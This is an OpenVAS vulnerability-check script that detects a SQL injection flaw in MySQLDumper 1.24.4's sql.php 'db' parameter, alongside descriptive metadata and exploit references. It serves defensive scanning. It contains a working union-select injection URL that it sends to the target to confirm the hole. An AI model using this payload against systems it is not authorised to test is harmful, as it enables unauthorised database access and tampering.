##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mysqldumper_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# MySQLDumper SQL Injection Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary SQL
  statements on the vulnerable system, which may leads to access or modify data
  in the underlying database.
  Impact Level: Application";

tag_affected = "MySQLDumper version 1.24.4";
tag_insight = "The flaw is due to improper validation of input passed via the 'db' parameter
  in sql.php script.";
tag_solution = "No solution or patch is available as of 29th May, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.mysqldumper.net";
tag_summary = "This host is running MySQLDumper and is prone to SQL injection vulnerability.";

if(description)
{
  script_id(903211);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-29 12:55:13 +0530 (Wed, 29 May 2013)");
  script_name("MySQLDumper SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.1337day.com/exploit/17551");
  script_xref(name : "URL" , value : "http://fuzzexp.org/exp/exploits.php?id=95");
  script_summary("Check if MySQLDumper is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/msd", "/mysqldumper", cgi_dirs()))
{
  url = dir + "/index.php";

  ## Confirm the application
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                    pattern:">MySQLDumper<", extra_check:"MySQL_Dumper_menu"))
  {
    ## Construct attack request
    url = dir + "/sql.php?db=-'%20union%20select%201,2,"+
                "'OpenVAS-SQL-Injection-Test'%20from%20tblusers%20where%20'1";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"openvas-sql-injection-test",
       extra_check: make_list("Database","Table View")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
